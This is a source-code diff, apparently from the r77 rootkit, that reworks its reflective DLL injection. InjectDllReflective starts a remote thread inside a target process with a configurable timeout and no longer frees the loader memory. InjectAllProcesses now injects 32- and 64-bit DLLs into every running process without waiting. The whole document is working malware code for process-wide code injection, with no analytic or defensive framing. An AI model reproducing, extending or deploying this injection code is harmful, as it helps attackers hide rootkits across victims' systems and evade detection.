@@ -4,7 +4,7 @@
 #include <Shlwapi.h>
 #include <Psapi.h>
 
-BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize)
+BOOL InjectDllReflective(DWORD processId, LPBYTE dll, DWORD dllSize, DWORD timeout)
 {
 	BOOL result = FALSE;
 
@@ -53,7 +53,7 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize)
 									HANDLE thread = NULL;
 									if (NT_SUCCESS(R77_NtCreateThreadEx(&thread, 0x1fffff, NULL, process, allocatedMemory + entryPoint, allocatedMemory, 0, 0, 0, 0, NULL)))
 									{
-										if (WaitForSingleObject(thread, 100) == WAIT_OBJECT_0)
+										if (timeout > 0 && WaitForSingleObject(thread, timeout) == WAIT_OBJECT_0)
 										{
 											// Return TRUE, only if DllMain returned TRUE.
 											// DllMain returns FALSE, for example, if r77 is already injected.
@@ -61,12 +61,6 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize)
 											if (GetExitCodeThread(thread, &exitCode))
 											{
 												result = exitCode != 0;
-											}
-
-											// The reflective loader will no longer need the DLL file.
-											if (!VirtualFreeEx(process, allocatedMemory, 0, MEM_RELEASE))
-											{
-												result = FALSE;
 											}
 										}
 
@@ -97,8 +91,8 @@ BOOL InjectAllProcesses(LPBYTE dll32, DWORD dll32Size, LPBYTE dll64, DWORD dll64
 
 		for (DWORD i = 0; i < processCount; i++)
 		{
-			InjectDll(processes[i], dll32, dll32Size);
-			InjectDll(processes[i], dll64, dll64Size);
+			InjectDllReflective(processes[i], dll32, dll32Size, 0);
+			InjectDllReflective(processes[i], dll64, dll64Size, 0);
 		}
 
 		result = TRUE;
